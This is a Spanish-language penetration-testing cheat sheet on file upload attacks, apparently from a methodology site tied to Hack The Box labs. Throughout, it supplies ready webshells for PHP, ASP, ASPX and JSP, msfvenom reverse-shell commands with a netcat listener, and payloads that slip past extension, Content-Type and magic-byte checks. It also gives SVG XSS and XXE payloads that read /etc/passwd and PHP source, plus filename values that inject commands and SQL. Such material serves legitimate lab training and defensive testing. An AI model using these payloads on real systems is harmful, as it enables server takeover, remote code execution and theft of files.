---
title: "File Upload Attacks"
description: "Bypass de extensión/MIME, polyglots y webshells via file upload."
sidebar:
  order: 7
  label: "File Upload Attacks"
---
> Subida de webshells/reverse shells mediante bypass de validaciones de extensión, Content-Type y MIME. Escalada a RCE. Ataques con SVG/XXE en uploads restringidos.

---


## Webshells

```php
<!-- PHP — minimal -->
<?php system($_REQUEST['cmd']); ?>

<!-- PHP — con GIF magic bytes (bypass MIME check) -->
GIF8<?php system($_GET['cmd']); ?>

<!-- PHP — alternativa con passthru -->
<?php passthru($_GET['cmd']); ?>
```

```asp
<!-- ASP/ASPX -->
<% eval request('cmd') %>
```

```bash
# SecLists webshells
/opt/useful/seclists/Web-Shells/   # PHP, ASP, JSP, etc.

# phpbash — terminal interactiva vía browser
# https://github.com/Arrexel/phpbash

# Uso post-upload
http://target/uploads/shell.php?cmd=id
http://target/profile_images/shell.php?cmd=whoami
# CTRL+U en browser para ver output sin HTML rendering
```

---

## Reverse Shell via Upload

```bash
# Descargar pentestmonkey PHP reverse shell
# Editar líneas 49-50: $ip = 'OUR_IP'; $port = OUR_PORT;

# Generar con msfvenom
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.jsp
msfvenom -p windows/x64/shell_reverse_tcp LHOST=OUR_IP LPORT=OUR_PORT -f aspx > reverse.aspx

# Listener
nc -lvnp OUR_PORT
```

---

## Bypass — Validación frontend (client-side only)

### Método 1 — Burp (preferido)

```
1. Subir imagen legítima → interceptar en Burp
2. Modificar: filename="shell.php"
3. Modificar: contenido → <?php system($_REQUEST['cmd']); ?>
4. Forward → File successfully uploaded
```

### Método 2 — Eliminar JS en DevTools

```
1. CTRL+SHIFT+C → Inspector
2. Clic en el input de archivo
3. Borrar: onchange="checkFile(this)"   (o la función de validación)
4. Opcionalmente borrar: accept=".jpg,.jpeg,.png"
5. Subir directamente shell.php
```

---

## Bypass — Blacklist de extensiones

### Extensiones PHP alternativas (probar todas)

```
.phtml  .php5  .php7  .phar  .phps  .pHp  .PhP  .PHP
.php3   .php4  .php6  .shtml
```

```bash
# Fuzzear con Burp Intruder — wordlist PHP extensions:
# https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst
# SecLists: /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt

# Ordenar resultados por Length → los que difieren = extensiones permitidas
```

---

## Bypass — Whitelist de extensiones

### Double Extension (regex sin `$` al final)

```bash
# Si regex es ^.*\.(jpg|jpeg|png) SIN $ al final → acepta cualquier extensión antes
shell.jpg.php       # pasa el check (contiene .jpg), ejecuta como PHP
shell.jpeg.php
shell.png.phtml
```

### Reverse Double Extension (config Apache/Nginx vulnerable)

```bash
# Si Apache config: <FilesMatch ".+\.ph(ar|p|tml)"> sin $ → cualquier archivo con .php en el nombre
shell.php.jpg       # pasa whitelist (termina en .jpg), ejecuta como PHP (contiene .php)

# Confirmar config de Apache:
# /etc/apache2/mods-enabled/php7.4.conf → FilesMatch sin $
```

### Character Injection (PHP antiguo o misconfigs)

```bash
# Generar wordlist de permutaciones
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
# Fuzzear con Burp Intruder
```

---

## Bypass — Content-Type Header

```bash
# El servidor valida el header Content-Type del multipart form
# Interceptar en Burp → cambiar:
Content-Type: application/octet-stream  →  Content-Type: image/jpg
Content-Type: image/jpg                 # también válido: image/jpeg, image/png, image/gif

# Nota: hay DOS headers Content-Type en el request multipart:
# 1. Header general de la request (arriba)
# 2. Header del archivo adjunto (abajo, en el body) ← este es el importante
```

---

## Bypass — MIME-Type (magic bytes)

```bash
# El servidor usa mime_content_type() → inspecciona los primeros bytes del archivo
# Añadir GIF magic bytes al inicio del payload

# En el body del request (Burp), añadir GIF8 al inicio:
GIF8
<?php system($_REQUEST['cmd']); ?>

# O crear el archivo directamente:
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.php
# Output empieza con "GIF8" pero ejecuta PHP

# Magic bytes más útiles:
# GIF8 → GIF image
# \xff\xd8\xff → JPEG (hexadecimal, insertar con Burp hex editor)
```

---

## Localizar el archivo subido

```bash
# 1. Inspeccionar el src del img tras upload
CTRL+SHIFT+C → clic en imagen → ver: src="/profile_images/shell.php"

# 2. Mirar respuesta del upload o historial Burp
# Location: /uploads/shell.php
# File saved at: /var/www/html/uploads/

# 3. Fuzzear directorio de uploads
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
  -u http://target/FUZZ -mc 200,301,302,403

# 4. LFI + SVG XXE para leer source code y encontrar el directorio
```

---

## Ataques con uploads restringidos (SVG, XML, HTML)

### XSS via SVG

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

### XSS via metadata EXIF (imágenes)

```bash
exiftool -Comment='"><img src=1 onerror=alert(window.origin)>' HTB.jpg
# La app muestra metadata → XSS ejecutado
```

### XXE via SVG — leer archivos del servidor

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

### XXE via SVG — leer source code PHP

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
<!-- Decodificar base64 del output: echo '...' | base64 -d -->
```

---

## Inyección en nombre de archivo

```bash
# Command injection en filename (si la app ejecuta mv/cp con el nombre)
file$(whoami).jpg
file`whoami`.jpg
file.jpg||whoami

# XSS en filename (si el nombre se muestra en la app)
<script>alert(window.origin);</script>.jpg

# SQLi en filename (si el nombre se almacena en DB sin sanitizar)
file';select+sleep(5);--.jpg
```

---

## Referencia de validaciones vs bypass

| Validación | Método de bypass |
|-----------|-----------------|
| Frontend JS | Burp interception / eliminar función JS |
| Blacklist extensión | Extensiones alternativas (phtml, php5, phar...) |
| Whitelist extensión | Double ext (shell.jpg.php) / reverse ext (shell.php.jpg) |
| Content-Type header | Cambiar a `image/jpg` en Burp |
| MIME-Type (magic bytes) | Añadir `GIF8` al inicio del contenido |
| Content-Type + MIME | Combinar: header + GIF8 |
| Extensión estricta (regex `$`) | Character injection (PHP < 5.5: `%00`) |

---

## Webshells por framework

| Framework | Extensión | Webshell |
|-----------|-----------|----------|
| PHP | `.php`, `.phtml` | `<?php system($_REQUEST['cmd']); ?>` |
| ASP | `.asp` | `<% eval request('cmd') %>` |
| ASPX | `.aspx` | `<% Response.Write(CreateObject("WScript.Shell").Exec(Request("cmd")).StdOut.ReadAll()) %>` |
| JSP | `.jsp` | `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>` |

---

## Pitfalls / Gotchas

- **Extensión en mayúsculas** → en Windows, `pHp`, `PHP` pueden bypassar blacklists case-sensitive.
- **Double Content-Type** → en requests multipart hay dos headers Content-Type. Cambiar el del attachment (el de abajo en el body).
- **GIF8 en output** → al usar magic bytes GIF8, el output del comando empieza con "GIF8". Normal, no afecta la ejecución.
- **`system()` deshabilitado** → si la función no está disponible, probar `passthru()`, `shell_exec()`, `exec()`, `popen()`.
- **Archivo ejecutado, no descargado** → si el servidor sirve el archivo como download, no ejecuta el PHP. Verificar si el directorio de uploads tiene `.htaccess` que bloquea ejecución.
- **Directorio de uploads desconocido** → usar `CTRL+SHIFT+C` para ver el src del img, o fuzzear con ffuf.
- **Reverse shell bloqueada por firewall** → intentar webshell primero; si la reverse shell no conecta, el server no puede salir. Usar bind shell o webshell.
- **msfvenom payload** → asegurarse de especificar `-f raw` para PHP (no generar un ejecutable).
- **Burp Community throttle en Intruder** → para fuzzear extensiones, aguantar el throttle o exportar la request y usar ffuf.
- **SVG rechazado** → si SVG no es aceptado, probar con XML, PDF, DOCX (todos soportan XXE).

---

## Cheatsheets relacionados

- [File Inclusion](/metodologias/web/file-inclusion/) — LFI + upload = RCE (incluir archivo subido vía LFI)
- [Shells & Payloads](/metodologias/exploitation/shells-payloads/) — reverse shells completas y webshells avanzadas
- [Using Web Proxies](/metodologias/web/using-web-proxies/) — interceptar y modificar requests de upload con Burp
- [Cross-Site Scripting (XSS)](/metodologias/web/cross-site-scripting-xss/) — XSS via SVG y metadata EXIF
- [Web Attacks](/metodologias/web/web-attacks/) — XXE via SVG/XML uploads
